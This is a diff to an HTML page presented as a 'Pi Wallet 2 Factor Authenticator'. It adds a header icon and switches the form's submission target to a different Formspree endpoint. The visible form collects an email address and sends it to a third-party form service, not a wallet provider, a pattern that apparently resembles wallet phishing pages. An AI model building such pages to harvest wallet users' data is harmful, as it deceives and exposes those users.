@@ -41,9 +41,23 @@
             text-align: center;
         }
 
+        .header-with-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .header-icon {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+        }
+
         .toggle-wrapper h2 {
             color: var(--pi-purple);
-            margin-bottom: 0.5rem;
+            margin-bottom: 0;
         }
 
         .subtitle {
@@ -144,11 +158,14 @@
 <body>
 
 <div class="toggle-wrapper">
-    <h2>🔐 Pi Wallet 2 Factor Authenticator</h2>
+    <div class="header-with-icon">
+        <img src="pi2fa.jpeg" alt="2FA Icon" class="header-icon">
+        <h2>Pi Wallet 2 Factor Authenticator</h2>
+    </div>
     <p class="subtitle">Secure your wallet with two-factor authentication</p>
 
     <!-- Formspree Form -->
-    <form id="toggleForm" action="https://formspree.io/f/xeeeejkg" method="POST">
+    <form id="toggleForm" action="https://formspree.io/f/mgvglzne" method="POST">
         <input
             type="email"
             name="email"
@@ -185,4 +202,3 @@
 <script src="script.js"></script>
 </body>
 </html>
-
